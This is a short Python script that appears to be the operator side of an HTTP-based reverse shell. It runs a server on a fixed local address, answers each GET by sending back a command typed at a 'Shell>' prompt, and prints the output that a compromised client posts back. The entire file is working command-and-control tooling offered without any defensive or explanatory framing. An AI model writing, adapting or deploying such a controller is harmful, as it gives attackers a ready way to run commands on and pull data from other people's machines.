import http.server

ipaddr = '192.168.43.210'
port = 8080

class myHandler(http.server.BaseHTTPRequestHandler):
	def do_GET(self):
		com=input('Shell> ')
		self.send_response(200)
		self.send_header("Content-type","text/html")
		self.end_headers()
		self.wfile.write(com.encode())

	def do_POST(self):
		self.send_response(200)
		self.end_headers()
		length = int(self.headers['Content-length'])
		pv=self.rfile.read(length)
		print(pv.decode())

server_class = http.server.HTTPServer
httpd = server_class((ipaddr,port),myHandler)
try:
	print('[+] started http server')
	httpd.serve_forever()
except:
	print('[-] server shut down')
	httpd.server_close()
